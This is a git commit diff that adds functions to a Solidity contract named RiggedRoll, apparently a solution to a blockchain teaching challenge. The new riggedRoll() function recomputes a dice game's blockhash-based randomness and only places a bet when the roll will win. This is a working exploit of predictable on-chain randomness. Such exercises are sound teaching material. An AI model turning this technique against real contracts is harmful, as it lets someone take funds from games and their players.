99c1f4208d10c2526e45ec93b932c93341094546
Gustavo Gonzalez <gggonzalez@fassil.com.bo>
2022-09-14 22:58:47 -0400

    add functions to RiggedRoll , now it passes the tests

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -13,12 +13,29 @@ contract RiggedRoll is Ownable {
         diceGame = DiceGame(diceGameAddress);
     }
 
-    //Add withdraw function to transfer ether from the rigged contract to an address
+    receive() external payable { }
 
+    function riggedRoll() public {
+        require(address(this).balance >= 0.002 ether, "The contract does not have enough eth. Please fund it first");
+        uint256 nonce = diceGame.nonce();
+        console.log('\t',"   Dice Game Rigged Roll Nonce:",nonce);
 
-    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
+        uint256 roll = uint256(hash) % 16;
+        console.log('\t',"   Dice Game Rigged Roll:",roll);
 
+        require(roll <= 2, "Roll will fail, try again");
+        diceGame.rollTheDice{value: 0.002 ether}();
+    }
 
-    //Add receive() function so contract can receive Eth
+    
+
+    function withdraw(address _addr, uint256 _amount) public onlyOwner {
+        require(address(this).balance >= _amount, "The contract doesnt have enough funds");
+
+        (bool sent, ) = _addr.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+    }
     
 }
